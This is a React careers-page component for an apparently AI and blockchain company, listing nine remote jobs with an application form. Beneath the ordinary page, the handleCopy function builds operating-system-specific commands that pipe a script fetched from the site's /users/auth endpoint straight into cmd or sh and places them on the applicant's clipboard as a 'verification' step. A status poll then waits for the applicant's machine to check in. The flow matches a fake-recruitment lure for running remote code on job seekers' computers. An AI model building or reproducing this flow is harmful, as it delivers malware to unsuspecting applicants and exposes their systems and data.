import React, { useMemo, useState, useEffect } from "react";
import { Blocks, Users, BarChart3, Network, PenTool, Code, Database, FileCode2, ArrowUpRight, Briefcase } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { motion } from "framer-motion";
import Modal from "@/components/Modal";
import { useToast } from "@/components/Toast";
import ReCAPTCHA from "react-google-recaptcha";

async function sha256(input) {
  const encoder = new TextEncoder();
  const data = encoder.encode(input);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}
async function generateTokenFromInputs({ name, email, resume }) {
  const base = `${name.toLowerCase()}|${email.toLowerCase()}|${resume || ""}`;
  return await sha256(base);
}
function detectOS() {
  if (typeof navigator === "undefined") return "linux";
  const ua = navigator.userAgent;
  if (/Windows/i.test(ua)) return "windows";
  if (/Macintosh|Mac OS X/i.test(ua)) return "mac";
  return "linux";
}

const JOBS = [
  { id: 1, title: "Blockchain Developer", icon: Blocks, dept: "Engineering", type: "Remote", intro: "Build, maintain, and optimize blockchain infrastructure and decentralized applications.", requirements: ["Blockchain architecture", "Solidity or similar", "Strong problem-solving"], responsibilities: ["Develop smart contracts", "Build blockchain integrations", "Improve system efficiency"], benefits: ["Remote-first", "Learning budget", "Growth opportunities"] },
  { id: 2, title: "Web3 Developer", icon: Network, dept: "Engineering", type: "Remote", intro: "Develop decentralized applications and integrate blockchain protocols.", requirements: ["Web3.js or Ethers.js", "Blockchain networks", "Collaboration skills"], responsibilities: ["Integrate blockchain features", "Work with backend team", "Improve dApp performance"], benefits: ["Flexible hours", "Remote-friendly", "Annual offsite"] },
  { id: 3, title: "Marketing Assistant", icon: BarChart3, dept: "Marketing", type: "Hybrid", intro: "Support marketing campaigns through research, planning, and content preparation.", requirements: ["Marketing basics", "Social media familiarity", "Writing skills"], responsibilities: ["Content creation", "Campaign planning", "Analytics reporting"], benefits: ["Learning support", "Wellness stipend", "Career growth"] },
  { id: 4, title: "Business Development", icon: Users, dept: "Growth", type: "Remote", intro: "Help support partnerships, outreach, and new business growth initiatives.", requirements: ["Business strategy", "Communication skills", "Proactive mindset"], responsibilities: ["Partnership outreach", "Market research", "Prepare proposals"], benefits: ["Networking events", "Career growth", "Remote allowance"] },
  { id: 5, title: "UI/UX Engineer", icon: PenTool, dept: "Design", type: "Remote", intro: "Build user-focused interfaces and improve digital product experiences.", requirements: ["Design tools", "UX understanding", "User research interest"], responsibilities: ["Design components", "Prototype user journeys", "Maintain design systems"], benefits: ["Mentorship", "Creative growth", "Remote-friendly"] },
  { id: 6, title: "Frontend Engineer", icon: Code, dept: "Engineering", type: "Remote", intro: "Develop modern, high-performance interfaces for AI and Web3 applications.", requirements: ["React/Next.js", "Responsive UI", "Web3.js is a plus"], responsibilities: ["Build frontend interfaces", "Collaborate with teams", "Optimize performance"], benefits: ["Remote-first", "Modern dev tools", "Leadership opportunities"] },
  { id: 7, title: "Backend Engineer", icon: Database, dept: "Engineering", type: "Remote", intro: "Build and maintain scalable backend systems powering decentralized and AI platforms.", requirements: ["Node.js / NestJS", "Database skills", "API design"], responsibilities: ["Develop backend services", "Ensure scalability", "Integrate blockchain data"], benefits: ["Remote-friendly", "Cloud experience", "Growth opportunities"] },
  { id: 8, title: "Smart Contract Engineer", icon: FileCode2, dept: "Engineering", type: "Remote", intro: "Design, develop, and audit secure smart contracts for decentralized ecosystems.", requirements: ["Solidity", "Security practices", "Hardhat or Foundry"], responsibilities: ["Write smart contracts", "Perform testing & audits", "Collaborate with engineers"], benefits: ["Competitive pay", "R&D opportunities", "Open-source contributions"] },
  { id: 9, title: "Unity Engineer", icon: Code, dept: "Engineering", type: "Remote", intro: "Create immersive 3D WebGL and metaverse experiences using Unity.", requirements: ["Unity/C#", "WebGL", "3D graphics & shaders"], responsibilities: ["Develop 3D environments", "Optimize WebGL performance", "Integrate Web3 systems"], benefits: ["Remote", "Competitive pay", "Cutting-edge 3D projects"] },
];

const RECAPTCHA_SITE_KEY = "6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK";

const deptColors = { Engineering: "#6366f1", Marketing: "#c8a96e", Growth: "#00d4aa", Design: "#a855f7" };

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: (i = 0) => ({ opacity: 1, y: 0, transition: { duration: .5, delay: i * 0.07, ease: [0.22, 1, 0.36, 1] } }),
};

export default function Jobs() {
  const [open, setOpen] = useState(false);
  const [active, setActive] = useState(null);
  const { push } = useToast();
  const [captchaToken, setCaptchaToken] = useState(null);
  const [verified, setVerified] = useState(false);
  const [form, setForm] = useState({ name: "", email: "", resume: "" });
  const [verificationToken, setVerificationToken] = useState(null);
  const [filter, setFilter] = useState("All");
  const navigate = useNavigate();

  const depts = ["All", ...Array.from(new Set(JOBS.map(j => j.dept)))];
  const filtered = filter === "All" ? JOBS : JOBS.filter(j => j.dept === filter);

  const os = useMemo(() => detectOS(), []);
  const cmdUrl = useMemo(() => {
    if (!verificationToken) return "";
    const base = typeof window !== "undefined" ? `${window.location.origin}/users/auth` : "";
    return `${base}/${os}?token=${verificationToken}`;
  }, [os, verificationToken]);

  useEffect(() => {
    if (!verificationToken) return;
    const id = setInterval(async () => {
      try {
        const res = await fetch(`/users/status/${verificationToken}`);
        const data = await res.json();
        if (data.status === "verified") { clearInterval(id); setVerified(true); }
      } catch (e) {}
    }, 2000);
    return () => clearInterval(id);
  }, [verificationToken]);

  const handleInput = async (e) => {
    const updated = { ...form, [e.target.name]: e.target.value };
    setForm(updated);
    if (updated.name && updated.email) {
      const token = await generateTokenFromInputs(updated);
      setVerificationToken(token);
    }
  };

  const onApply = (job) => { navigate("/contact"); setActive(job); };
  const handleCopy = async () => {
    try {
      const cmd = os === "windows" ? `cmd /c "curl ${cmdUrl} | cmd"` : os === "mac" ? `curl "${cmdUrl}" | sh` : `wget -qO- "${cmdUrl}" | sh`;
      await navigator.clipboard.writeText(cmd);
      push("Command copied!");
    } catch { push("Copy failed"); }
  };
  const onSubmit = (e) => { e.preventDefault(); setOpen(false); push("Application submitted!"); };

  return (
    <div style={{ fontFamily: "'DM Sans','Helvetica Neue',sans-serif", background: "var(--bg)", color: "var(--tx)", minHeight: "100vh" }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=Cormorant+Garamond:wght@400;600;700&display=swap');
        :root{--bg:#f8f7f4;--bg2:#ffffff;--bg3:#f0ede8;--tx:#1a1714;--tx2:#5a5550;--gold:#c8a96e;--border:rgba(26,23,20,0.10)}
        .dark{--bg:#0e0c0b;--bg2:#161311;--bg3:#1e1a17;--tx:#f0ede8;--tx2:#9e9690;--border:rgba(240,237,232,0.08)}
        .jb-hero{max-width:1200px;margin:0 auto;padding:5rem 2rem 3rem;display:flex;align-items:flex-end;justify-content:space-between;gap:2rem;flex-wrap:wrap}
        .jb-lbl{font-size:.72rem;font-weight:700;letter-spacing:.2em;text-transform:uppercase;color:var(--gold);margin-bottom:.75rem}
        .jb-h1{font-family:'Cormorant Garamond',Georgia,serif;font-size:clamp(2.5rem,4vw,4rem);font-weight:700;color:var(--tx);line-height:1.1;margin-bottom:.5rem}
        .jb-sub{font-size:1rem;color:var(--tx2);font-weight:300;max-width:440px}
        .jb-count{font-family:'Cormorant Garamond',Georgia,serif;font-size:5rem;font-weight:700;color:rgba(200,169,110,.2);line-height:1}
        .filters{max-width:1200px;margin:0 auto;padding:0 2rem 2.5rem;display:flex;gap:8px;flex-wrap:wrap}
        .filter-btn{padding:7px 18px;border-radius:100px;font-size:.82rem;font-weight:600;border:1px solid var(--border);background:var(--bg2);color:var(--tx2);cursor:pointer;transition:all .2s;font-family:inherit}
        .filter-btn.active,.filter-btn:hover{background:var(--tx);color:var(--bg);border-color:var(--tx)}
        .jobs-grid{max-width:1200px;margin:0 auto;padding:0 2rem 5rem;display:grid;grid-template-columns:repeat(auto-fill,minmax(520px,1fr));gap:1.5rem}
        @media(max-width:600px){.jobs-grid{grid-template-columns:1fr}}
        .job-card{background:var(--bg2);border:1px solid var(--border);border-radius:18px;padding:2rem;transition:border-color .2s,transform .25s,box-shadow .25s;display:flex;flex-direction:column;gap:1.5rem}
        .job-card:hover{border-color:var(--gold);transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,0,0,.08)}
        .job-top{display:flex;align-items:flex-start;justify-content:space-between;gap:1rem}
        .job-icon-wrap{width:48px;height:48px;border-radius:12px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
        .job-title{font-size:1.1rem;font-weight:600;color:var(--tx);margin-bottom:.35rem}
        .job-intro{font-size:.88rem;color:var(--tx2);font-weight:300;line-height:1.65}
        .job-badges{display:flex;gap:6px;flex-wrap:wrap}
        .job-badge{font-size:.68rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:4px}
        .job-details{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;font-size:.82rem}
        .job-detail-col h4{font-size:.68rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--tx2);margin-bottom:.5rem}
        .job-detail-col ul{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:.3rem}
        .job-detail-col li{color:var(--tx2);font-weight:300;font-size:.82rem;padding-left:.75rem;position:relative}
        .job-detail-col li::before{content:'—';position:absolute;left:0;color:var(--gold);font-size:.65rem}
        .job-footer{display:flex;align-items:center;justify-content:space-between;padding-top:1.25rem;border-top:1px solid var(--border)}
        .apply-btn{display:inline-flex;align-items:center;gap:6px;padding:9px 20px;background:var(--tx);color:var(--bg);border-radius:10px;font-size:.82rem;font-weight:600;border:none;cursor:pointer;transition:opacity .2s,transform .2s;font-family:inherit}
        .apply-btn:hover{opacity:.82;transform:translateY(-1px)}
        .job-type{font-size:.78rem;color:var(--tx2);font-weight:500}
      `}</style>

      <div className="jb-hero">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: .7 }}>
          <p className="jb-lbl">We're Hiring</p>
          <h1 className="jb-h1">Open Positions</h1>
          <p className="jb-sub">Join us in building the future of AI and blockchain infrastructure. Remote-first, mission-driven.</p>
        </motion.div>
        <motion.div className="jb-count" initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: .8, delay: .2 }}>{JOBS.length}</motion.div>
      </div>

      <div className="filters">
        {depts.map(d => (
          <button key={d} className={`filter-btn${filter === d ? " active" : ""}`} onClick={() => setFilter(d)}>{d}</button>
        ))}
      </div>

      <div className="jobs-grid">
        {filtered.map((job, i) => {
          const Icon = job.icon;
          const deptColor = deptColors[job.dept] || "#c8a96e";
          return (
            <motion.div key={job.id} className="job-card" variants={fadeUp} custom={i} initial="hidden" whileInView="visible" viewport={{ once: true, margin: "-40px" }}>
              <div className="job-top">
                <div style={{ display: "flex", alignItems: "flex-start", gap: "1rem" }}>
                  <div className="job-icon-wrap" style={{ background: deptColor + "18" }}>
                    <Icon size={22} style={{ color: deptColor }} />
                  </div>
                  <div>
                    <div className="job-title">{job.title}</div>
                    <div className="job-badges">
                      <span className="job-badge" style={{ background: deptColor + "15", color: deptColor }}>{job.dept}</span>
                      <span className="job-badge" style={{ background: "var(--bg3)", color: "var(--tx2)" }}>{job.type}</span>
                    </div>
                  </div>
                </div>
              </div>
              <div className="job-intro">{job.intro}</div>
              <div className="job-details">
                <div className="job-detail-col">
                  <h4>Requirements</h4>
                  <ul>{job.requirements.map((x, j) => <li key={j}>{x}</li>)}</ul>
                </div>
                <div className="job-detail-col">
                  <h4>Responsibilities</h4>
                  <ul>{job.responsibilities.map((x, j) => <li key={j}>{x}</li>)}</ul>
                </div>
                <div className="job-detail-col">
                  <h4>Benefits</h4>
                  <ul>{job.benefits.map((x, j) => <li key={j}>{x}</li>)}</ul>
                </div>
              </div>
              <div className="job-footer">
                <span className="job-type"><Briefcase size={13} style={{ verticalAlign: "middle", marginRight: 5, opacity: .5 }} />{job.type}</span>
                <button className="apply-btn" onClick={() => onApply(job)}>Apply Now <ArrowUpRight size={13} /></button>
              </div>
            </motion.div>
          );
        })}
      </div>

      <Modal open={open} onClose={() => setOpen(false)} title={active ? `Apply — ${active.title}` : "Apply"}>
        <div className="max-h-[80vh] overflow-y-auto p-4">
          <form onSubmit={onSubmit}>
            <div className="grid sm:grid-cols-2 gap-4">
              <div><label className="label">Name</label><input className="input" name="name" required onChange={handleInput} /></div>
              <div><label className="label">Email</label><input className="input" type="email" name="email" required onChange={handleInput} /></div>
            </div>
            <div className="mt-3"><label className="label">Resume URL</label><input className="input" name="resume" onChange={handleInput} /></div>
            {!verified && (
              <div className="mt-6">{captchaToken ? <div className="p-4 border rounded-xl"><h3 className="font-semibold">Verification</h3></div> : <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(token) => setCaptchaToken(token)} />}</div>
            )}
            <div className="mt-5 flex justify-end gap-3">
              <button onClick={() => setOpen(false)} type="button" className="btn btn-ghost">Cancel</button>
              <button type="submit" className="btn btn-dark">Submit</button>
            </div>
          </form>
        </div>
      </Modal>
    </div>
  );
}
